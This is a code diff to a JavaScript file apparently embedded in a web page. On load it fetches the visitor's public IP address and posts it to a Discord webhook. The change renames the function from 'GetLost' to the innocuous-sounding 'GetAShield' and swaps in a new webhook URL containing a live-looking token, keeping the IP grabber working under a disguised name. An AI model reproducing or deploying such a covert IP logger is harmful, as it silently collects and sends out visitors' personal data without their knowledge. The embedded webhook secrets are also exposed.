@@ -1,10 +1,10 @@
-function GetLost() {
+function GetAShield() {
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ip = data.ip;
 
-            const webhookUrl = "https://discord.com/api/webhooks/1342645898680729722/SRg-iWSeW1vGljXxdGBWYDhzvQS04fU6ZiDuNdMeTvAscf5ZF2raaX8cCUJR5IpPP8d4";
+            const webhookUrl = "https://discord.com/api/webhooks/1431830725736267908/IMA31zfHHdxG2G6z_-eHXucHz7JwP6yLFB3caKxkRYUndN6TV6rqcmVHH4lac9IfSSqA";
             const payload = {
                 content: `User IP: **${ip}**`,
                 avatar_url: "https://cdn.xoa.me/uploads/611e43ef-ba96-4914-aa7c-a1c85149415b.jpg"
@@ -30,4 +30,4 @@ function GetLost() {
         });
 }
 
-GetLost();
+GetAShield();
